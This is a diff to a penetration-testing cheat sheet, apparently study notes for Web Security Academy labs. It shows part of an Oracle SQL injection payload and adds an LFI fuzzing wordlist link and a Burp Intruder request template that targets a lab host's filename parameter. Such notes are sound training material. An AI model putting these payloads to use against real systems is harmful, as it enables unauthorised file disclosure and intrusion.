@@ -32,7 +32,13 @@ Oracle - `'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?
 ### Server-side request forge (SSRF)
 ### Path traversal
 #### LFI fuzzing
-Fuzzing list [here](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt)
+For fuzzing lists, use:
+- Burp Pro default
+- [Jhaddix fuzzing list](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt)
+```
+GET /image?filename=<INTRUDER_INPUT>
+Host: 0a35003b04de89b2824392b5001e00b4.web-security-academy.net
+```
 
 ### XXE Injection
 ```
